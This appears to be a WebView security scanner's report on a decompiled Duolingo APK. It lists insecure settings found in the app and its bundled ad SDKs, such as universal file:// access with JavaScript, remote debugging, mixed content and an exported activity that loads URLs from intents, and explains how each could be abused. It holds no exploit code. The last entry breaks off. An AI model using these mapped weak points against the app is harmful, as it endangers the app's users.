# WebView / in-app browser recon: `samples/duolingo.apk`

- Package: `com.duolingo` 6.98.4 (code 2463)
- SDK: min 29 / target 36
- Network security config: `network_security_config.xml` (cleartext permitted = None)
- Native libs touching WebView: 0

## Summary

- CRITICAL: 5
- HIGH: 32
- MEDIUM: 56
- LOW: 20
- INFO: 6

## Findings

### [CRITICAL] WV-SET-004 - file:// pages may load arbitrary remote origins (argument unresolved)
_analysis/duolingo/work/smali_classes4/xg90.smali:100 (applyWebSettings)_

setAllowUniversalAccessFromFileURLs(true) lets a file:// page make cross-origin requests to any host, leaking local file contents to a remote server.

```
:goto_1
    invoke-virtual {p0, p2}, Landroid/webkit/WebSettings;->setAllowUniversalAccessFromFileURLs(Z)V
```

### [CRITICAL] WV-SET-004 - file:// pages may load arbitrary remote origins (True)
_analysis/duolingo/work/smali_classes7/com/duolingo/web/WebViewActivity.smali:173 (onCreate)_

setAllowUniversalAccessFromFileURLs(true) lets a file:// page make cross-origin requests to any host, leaking local file contents to a remote server.

```
move-result-object v3

    invoke-virtual {v3, v4}, Landroid/webkit/WebSettings;->setAllowUniversalAccessFromFileURLs(Z)V
```

### [CRITICAL] WV-SET-004 - file:// pages may load arbitrary remote origins (True)
_analysis/duolingo/work/smali_classes9/com/unity3d/services/core/webview/WebView.smali:171 (<init>)_

setAllowUniversalAccessFromFileURLs(true) lets a file:// page make cross-origin requests to any host, leaking local file contents to a remote server.

```
invoke-virtual {p3, p4}, Landroid/webkit/WebSettings;->setAllowFileAccessFromFileURLs(Z)V

    invoke-virtual {p3, p4}, Landroid/webkit/WebSettings;->setAllowUniversalAccessFromFileURLs(Z)V
```

### [CRITICAL] CORR-001 - com.unity3d.services.core.webview.WebView: file:// pages can reach any remote origin with JS on
_com.unity3d.services.core.webview.WebView_

A local file rendered in this WebView can exfiltrate itself to any attacker-controlled host. This is the worst-case WebView configuration.

```
setAllowUniversalAccessFromFileURLs(true) + setJavaScriptEnabled(true)
```

### [CRITICAL] CORR-001 - com.duolingo.web.WebViewActivity: file:// pages can reach any remote origin with JS on
_com.duolingo.web.WebViewActivity_

A local file rendered in this WebView can exfiltrate itself to any attacker-controlled host. This is the worst-case WebView configuration.

```
setAllowUniversalAccessFromFileURLs(true) + setJavaScriptEnabled(true)
```

### [HIGH] WV-SET-002 - Local file access enabled (argument unresolved)
_analysis/duolingo/work/smali/com/bytedance/sdk/component/mtv/dd.smali:1588 (setAllowFileAccess)_

setAllowFileAccess(true) lets the WebView read file:// URLs, exposing files the app process can read.

```
move-result-object p0

    invoke-virtual {p0, p1}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V
    :try_end_0
```

### [HIGH] WV-SET-009 - Mixed content allowed (argument unresolved)
_analysis/duolingo/work/smali/com/bytedance/sdk/component/mtv/dd.smali:1927 (setMixedContentMode)_

setMixedContentMode(ALWAYS_ALLOW) permits loading http:// subresources inside an https:// page, enabling network attackers to inject script.

```
move-result-object p0

    invoke-virtual {p0, p1}, Landroid/webkit/WebSettings;->setMixedContentMode(I)V
    :try_end_0
```

### [HIGH] WV-SET-002 - Local file access enabled (True)
_analysis/duolingo/work/smali_assets/audience_network/com/facebook/ads/redexgen/X/cz.smali:405 (A04)_

setAllowFileAccess(true) lets the WebView read file:// URLs, exposing files the app process can read.

```
.line 78433
    invoke-virtual {v1, v0}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V
```

### [HIGH] WV-SET-003 - file:// pages may load other file:// resources (True)
_analysis/duolingo/work/smali_assets/audience_network/com/facebook/ads/redexgen/X/cz.smali:408 (A04)_

setAllowFileAccessFromFileURLs(true) lets a file:// page read other local files via XMLHttpRequest/fetch.

```
.line 78434
    invoke-virtual {v1, v0}, Landroid/webkit/WebSettings;->setAllowFileAccessFromFileURLs(Z)V
```

### [HIGH] WV-SET-002 - Local file access enabled (True)
_analysis/duolingo/work/smali_assets/audience_network/com/facebook/ads/redexgen/X/I5.smali:107 (<init>)_

setAllowFileAccess(true) lets the WebView read file:// URLs, exposing files the app process can read.

```
const/4 v0, 0x1

    invoke-virtual {v1, v0}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V
```

### [HIGH] WV-SET-002 - Local file access enabled (True)
_analysis/duolingo/work/smali_classes3/com/ironsource/Og.smali:107 (a)_

setAllowFileAccess(true) lets the WebView read file:// URLs, exposing files the app process can read.

```
invoke-virtual {p0, v2}, Landroid/view/View;->setHorizontalScrollBarEnabled(Z)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V
```

### [HIGH] WV-SET-010 - WebView remote debugging enabled app-wide (argument unresolved)
_analysis/duolingo/work/smali_classes3/com/ironsource/sdk/controller/v.smali:1806 (a)_

WebView.setWebContentsDebuggingEnabled(true) is a static, process-wide switch. Any WebView in the app becomes attachable over adb (chrome://inspect) without the debuggable build flag. On a production build this exposes live page content and JS bridges to anyone with USB debugging, and is a ready-made dynamic-instrumentation ramp.

```
.line 409
    invoke-static {p0}, Landroid/webkit/WebView;->setWebContentsDebuggingEnabled(Z)V
```

### [HIGH] WV-SET-009 - Mixed content allowed (True)
_analysis/duolingo/work/smali_classes3/com/google/android/gms/internal/ads/zzcme.smali:293 (<init>)_

setMixedContentMode(ALWAYS_ALLOW) permits loading http:// subresources inside an https:// page, enabling network attackers to inject script.

```
if-eqz p3, :cond_1

    invoke-virtual {p2, v1}, Landroid/webkit/WebSettings;->setMixedContentMode(I)V
```

### [HIGH] WV-SET-002 - Local file access enabled (True)
_analysis/duolingo/work/smali_classes4/xg90.smali:60 (applyWebSettings)_

setAllowFileAccess(true) lets the WebView read file:// URLs, exposing files the app process can read.

```
invoke-virtual {p0, v0}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    invoke-virtual {p0, v1}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V
```

### [HIGH] WV-SET-003 - file:// pages may load other file:// resources (True)
_analysis/duolingo/work/smali_classes4/xg90.smali:80 (applyWebSettings)_

setAllowFileAccessFromFileURLs(true) lets a file:// page read other local files via XMLHttpRequest/fetch.

```
:goto_0
    invoke-virtual {p0, v1}, Landroid/webkit/WebSettings;->setAllowFileAccessFromFileURLs(Z)V
```

### [HIGH] WV-SET-010 - WebView remote debugging enabled app-wide (argument unresolved)
_analysis/duolingo/work/smali_classes4/com/unity3d/ads/core/domain/HandleDebugSettings.smali:47 (invoke)_

WebView.setWebContentsDebuggingEnabled(true) is a static, process-wide switch. Any WebView in the app becomes attachable over adb (chrome://inspect) without the debuggable build flag. On a production build this exposes live page content and JS bridges to anyone with USB debugging, and is a ready-made dynamic-instrumentation ramp.

```
move-result p0

    invoke-static {p0}, Landroid/webkit/WebView;->setWebContentsDebuggingEnabled(Z)V
```

### [HIGH] WV-SET-010 - WebView remote debugging enabled app-wide (argument unresolved)
_analysis/duolingo/work/smali_classes5/ns1.smali:1046 (initWebView)_

WebView.setWebContentsDebuggingEnabled(true) is a static, process-wide switch. Any WebView in the app becomes attachable over adb (chrome://inspect) without the debuggable build flag. On a production build this exposes live page content and JS bridges to anyone with USB debugging, and is a ready-made dynamic-instrumentation ramp.

```
move-result v2

    invoke-static {v2}, Landroid/webkit/WebView;->setWebContentsDebuggingEnabled(Z)V
```

### [HIGH] WV-SET-010 - WebView remote debugging enabled app-wide (True)
_analysis/duolingo/work/smali_classes6/li0.smali:178 (invoke)_

WebView.setWebContentsDebuggingEnabled(true) is a static, process-wide switch. Any WebView in the app becomes attachable over adb (chrome://inspect) without the debuggable build flag. On a production build this exposes live page content and JS bridges to anyone with USB debugging, and is a ready-made dynamic-instrumentation ramp.

```
invoke-direct {v9, v0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    invoke-static {v4}, Landroid/webkit/WebView;->setWebContentsDebuggingEnabled(Z)V
```

### [HIGH] WV-SET-003 - file:// pages may load other file:// resources (True)
_analysis/duolingo/work/smali_classes7/com/duolingo/web/WebViewActivity.smali:167 (onCreate)_

setAllowFileAccessFromFileURLs(true) lets a file:// page read other local files via XMLHttpRequest/fetch.

```
move-result-object v3

    invoke-virtual {v3, v4}, Landroid/webkit/WebSettings;->setAllowFileAccessFromFileURLs(Z)V
```

### [HIGH] WV-SET-010 - WebView remote debugging enabled app-wide (True)
_analysis/duolingo/work/smali_classes7/com/duolingo/web/WebViewActivity.smali:175 (onCreate)_

WebView.setWebContentsDebuggingEnabled(true) is a static, process-wide switch. Any WebView in the app becomes attachable over adb (chrome://inspect) without the debuggable build flag. On a production build this exposes live page content and JS bridges to anyone with USB debugging, and is a ready-made dynamic-instrumentation ramp.

```
invoke-virtual {v3, v4}, Landroid/webkit/WebSettings;->setAllowUniversalAccessFromFileURLs(Z)V

    invoke-static {v4}, Landroid/webkit/WebView;->setWebContentsDebuggingEnabled(Z)V
```

### [HIGH] WV-SET-009 - Mixed content allowed (True)
_analysis/duolingo/work/smali_classes9/com/unity3d/ads/core/domain/AndroidGetWebViewContainerUseCase$invoke$webview$1.smali:191 (invokeSuspend)_

setMixedContentMode(ALWAYS_ALLOW) permits loading http:// subresources inside an https:// page, enabling network attackers to inject script.

```
invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setMediaPlaybackRequiresUserGesture(Z)V

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setMixedContentMode(I)V
```

### [HIGH] WV-SET-003 - file:// pages may load other file:// resources (True)
_analysis/duolingo/work/smali_classes9/com/unity3d/services/core/webview/WebView.smali:169 (<init>)_

setAllowFileAccessFromFileURLs(true) lets a file:// page read other local files via XMLHttpRequest/fetch.

```
const/4 p4, 0x1

    invoke-virtual {p3, p4}, Landroid/webkit/WebSettings;->setAllowFileAccessFromFileURLs(Z)V
```

### [HIGH] WV-SET-002 - Local file access enabled (True)
_analysis/duolingo/work/smali_classes9/com/unity3d/services/core/webview/WebView.smali:173 (<init>)_

setAllowFileAccess(true) lets the WebView read file:// URLs, exposing files the app process can read.

```
invoke-virtual {p3, p4}, Landroid/webkit/WebSettings;->setAllowUniversalAccessFromFileURLs(Z)V

    invoke-virtual {p3, p4}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V
```

### [HIGH] WV-SET-009 - Mixed content allowed (True)
_analysis/duolingo/work/smali_classes9/com/unity3d/services/core/webview/WebView.smali:209 (<init>)_

setMixedContentMode(ALWAYS_ALLOW) permits loading http:// subresources inside an https:// page, enabling network attackers to inject script.

```
invoke-virtual {p3, v0}, Landroid/webkit/WebSettings;->setMediaPlaybackRequiresUserGesture(Z)V

    invoke-virtual {p3, p4}, Landroid/webkit/WebSettings;->setMixedContentMode(I)V
```

### [HIGH] WV-SET-002 - Local file access enabled (True)
_analysis/duolingo/work/smali_classes9/com/moloco/sdk/xenoss/sdkdevkit/android/adrenderer/internal/templates/renderer/e.smali:86 (<init>)_

setAllowFileAccess(true) lets the WebView read file:// URLs, exposing files the app process can read.

```
invoke-virtual {p2, p1}, Landroid/webkit/WebSettings;->setMediaPlaybackRequiresUserGesture(Z)V

    invoke-virtual {p2, p3}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V
```

### [HIGH] WV-SET-009 - com.bytedance.sdk.openadsdk.bxs.mtv: mixed content mode ALWAYS_ALLOW
_com.bytedance.sdk.openadsdk.bxs.mtv_

setMixedContentMode(ALWAYS_ALLOW) permits loading http:// subresources inside an https:// page, enabling network attackers to inject script.

```
setMixedContentMode(0)
```

### [HIGH] WV-SET-010 - WebView remote debugging enabled app-wide (True)
_com.facebook.ads.redexgen.core.AbstractC1278Ze_

WebView.setWebContentsDebuggingEnabled(true) is a static, process-wide switch. Any WebView in the app becomes attachable over adb (chrome://inspect) without the debuggable build flag. On a production build this exposes live page content and JS bridges to anyone with USB debugging, and is a ready-made dynamic-instrumentation ramp.

```
debugging -> True
```

### [HIGH] WV-SET-002 - Local file access enabled (True)
_defpackage.xg90_

setAllowFileAccess(true) lets the WebView read file:// URLs, exposing files the app process can read.

```
access -> True
```

### [HIGH] WV-SET-002 - Local file access enabled (True)
_com.facebook.ads.redexgen.core.C1483cz_

setAllowFileAccess(true) lets the WebView read file:// URLs, exposing files the app process can read.

```
access -> True
```

### [HIGH] WV-SET-003 - file:// pages may load other file:// resources (True)
_com.facebook.ads.redexgen.core.C1483cz_

setAllowFileAccessFromFileURLs(true) lets a file:// page read other local files via XMLHttpRequest/fetch.

```
urls -> True
```

### [HIGH] WV-SET-009 - com.facebook.ads.redexgen.core.AbstractC1284Zk: mixed content mode ALWAYS_ALLOW
_com.facebook.ads.redexgen.core.AbstractC1284Zk_

setMixedContentMode(ALWAYS_ALLOW) permits loading http:// subresources inside an https:// page, enabling network attackers to inject script.

```
setMixedContentMode(0)
```

### [HIGH] CORR-002 - com.unity3d.services.core.webview.WebView: local file access + JS bridge
_com.unity3d.services.core.webview.WebView_

Page script can read local files and drive an exposed native bridge, so a file:// or navigated-to page escalates into native capability.

```
file access enabled + addJavascriptInterface + JS enabled
```

### [HIGH] CORR-002 - com.duolingo.web.WebViewActivity: local file access + JS bridge
_com.duolingo.web.WebViewActivity_

Page script can read local files and drive an exposed native bridge, so a file:// or navigated-to page escalates into native capability.

```
file access enabled + addJavascriptInterface + JS enabled
```

### [HIGH] CORR-004 - com.duolingo.web.WebViewActivity: remote WebView debugging enabled
_com.duolingo.web.WebViewActivity_

Any WebView in the process is attachable via chrome://inspect. On a production build this is an instrumentation ramp for all in-app web content.

```
WebView.setWebContentsDebuggingEnabled(true)
```

### [HIGH] CORR-004 - li0: remote WebView debugging enabled
_li0_

Any WebView in the process is attachable via chrome://inspect. On a production build this is an instrumentation ramp for all in-app web content.

```
WebView.setWebContentsDebuggingEnabled(true)
```

### [HIGH] CORR-004 - com.facebook.ads.redexgen.core.AbstractC1278Ze: remote WebView debugging enabled
_com.facebook.ads.redexgen.core.AbstractC1278Ze_

Any WebView in the process is attachable via chrome://inspect. On a production build this is an instrumentation ramp for all in-app web content.

```
WebView.setWebContentsDebuggingEnabled(true)
```

### [HIGH] CORR-023 - org.prebid.mobile.rendering.views.browser.AdBrowserActivity: exported entry point loads an Intent-supplied URL into a WebView
_org.prebid.mobile.rendering.views.browser.AdBrowserActivity_

This exported activity derives the URL it displays from the Intent that started it (extra, data, or an extra's URL field) and passes it straight to WebView.loadUrl. Any app on the device can start it with an explicit intent and an arbitrary URL — no intent-filter is required, and no in-app user action is involved — so attacker-controlled web content renders inside the app's own WebView.

```
exported=true; intent extras -> getString(EXTRA_URL) -> loadUrl
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali/com/bytedance/sdk/component/mtv/dd.smali:488 (setJavaScriptEnabled)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 p1, 0x1

    invoke-virtual {p0, p1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
    :try_end_0
```

### [MEDIUM] WV-SET-007 - Scripts may open windows without user interaction (argument unresolved)
_analysis/duolingo/work/smali/com/bytedance/sdk/component/mtv/dd.smali:1800 (setJavaScriptCanOpenWindowsAutomatically)_

setJavaScriptCanOpenWindowsAutomatically(true) lets page script spawn windows unprompted, useful for phishing or driving native bridges.

```
move-result-object p0

    invoke-virtual {p0, p1}, Landroid/webkit/WebSettings;->setJavaScriptCanOpenWindowsAutomatically(Z)V
    :try_end_0
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (argument unresolved)
_analysis/duolingo/work/smali/com/bytedance/sdk/component/mtv/dd.smali:1819 (setJavaScriptEnabled)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
move-result-object p0

    invoke-virtual {p0, p1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
    :try_end_0
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali/com/confiant/android/sdk/b.smali:979 (a)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v8, 0x1

    invoke-virtual {v0, v8}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_assets/audience_network/com/facebook/ads/redexgen/X/Ze.smali:258 (A0E)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v2, 0x1

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes10/org/prebid/mobile/rendering/views/browser/AdBrowserActivity.smali:346 (setWebViewSettings)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes10/org/prebid/mobile/rendering/views/webview/AdWebView.smali:131 (initBaseWebSettings)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 p0, 0x1

    invoke-virtual {p1, p0}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes10/zendesk/support/guide/ViewArticleActivity.smali:996 (onCreate)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
move-result-object p1

    invoke-virtual {p1, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes3/com/ironsource/Og.smali:111 (a)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-007 - Scripts may open windows without user interaction (True)
_analysis/duolingo/work/smali_classes3/com/ironsource/Og.smali:115 (a)_

setJavaScriptCanOpenWindowsAutomatically(true) lets page script spawn windows unprompted, useful for phishing or driving native bridges.

```
invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setSupportMultipleWindows(Z)V

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptCanOpenWindowsAutomatically(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes3/com/google/android/gms/internal/ads/zzcme.smali:251 (<init>)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
:try_start_0
    invoke-virtual {p2, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
    :try_end_0
```

### [MEDIUM] WV-SET-007 - Scripts may open windows without user interaction (True)
_analysis/duolingo/work/smali_classes3/com/google/android/gms/internal/ads/zzcme.smali:273 (<init>)_

setJavaScriptCanOpenWindowsAutomatically(true) lets page script spawn windows unprompted, useful for phishing or driving native bridges.

```
invoke-virtual {p2, v1}, Landroid/webkit/WebSettings;->setSupportMultipleWindows(Z)V

    invoke-virtual {p2, v1}, Landroid/webkit/WebSettings;->setJavaScriptCanOpenWindowsAutomatically(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes4/xg90.smali:52 (applyWebSettings)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v1, 0x1

    invoke-virtual {p0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes5/ns1.smali:1050 (initWebView)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v2, 0x1

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-005 - content:// access enabled (True)
_analysis/duolingo/work/smali_classes5/ns1.smali:1052 (initWebView)_

setAllowContentAccess(true) lets the WebView follow content:// URLs, widening the reachable data set.

```
invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    invoke-virtual {v0, v2}, Landroid/webkit/WebSettings;->setAllowContentAccess(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes5/com/bytedance/sdk/openadsdk/bxs/mtv.smali:92 (uc)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
:try_start_0
    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
    :try_end_0
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes5/com/bytedance/sdk/openadsdk/core/widget/uc/phb.smali:232 (uc)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
:try_start_0
    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
    :try_end_0
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes5/com/bytedance/sdk/openadsdk/activity/single/TTWebsiteActivity.smali:452 (qtm)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
:try_start_2
    invoke-virtual {p1, v3}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes5/com/bytedance/sdk/openadsdk/activity/single/TTWebsiteActivity.smali:1209 (uc)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
:try_start_2
    invoke-virtual {v0, v4}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes6/xn20.smali:3969 (zzb)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v4, 0x1

    invoke-virtual {v3, v4}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes6/li0.smali:192 (invoke)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
move-result-object v1

    invoke-virtual {v1, v4}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes7/com/duolingo/web/WebViewActivity.smali:147 (onCreate)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v4, 0x1

    invoke-virtual {v3, v4}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes8/d8b0.smali:50 (a)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes8/x8b0.smali:111 (<init>)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v1, 0x1

    invoke-virtual {p3, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes8/com/facebook/internal/WebDialog.smali:742 (setUpWebView)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
:cond_5
    invoke-virtual {v1, v4}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes8/com/google/android/gms/ads/internal/zzs.smali:62 (<init>)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 p2, 0x1

    invoke-virtual {p1, p2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes8/com/google/android/gms/internal/consent_sdk/zzbe.smali:382 (zzf)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v3, 0x1

    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes8/com/google/android/gms/internal/ads/zzfwm.smali:54 (zza)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes8/com/google/android/gms/internal/ads/zzfwj.smali:28 (<init>)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v0, 0x1

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/ironsource/Mf.smali:138 (a)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
:cond_1
    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/ironsource/Mf.smali:147 (a)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/iab/omid/library/ironsrc/publisher/a.smali:29 (<init>)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v0, 0x1

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/iab/omid/library/ironsrc/publisher/b.smali:207 (j)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/iab/omid/library/amazon/publisher/a.smali:29 (<init>)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v0, 0x1

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/iab/omid/library/amazon/publisher/b.smali:207 (j)_

setJavaScriptEnabled(true) turns the WebView into a script-capable browser. Expected for web apps, but it is a precondition for every other JS-related issue and must be paired with an allowlist.

```
const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
_analysis/duolingo/work/smali_classes9/com/iab/omid/library/unity3d/publisher/a.smali:29 (<init>)_

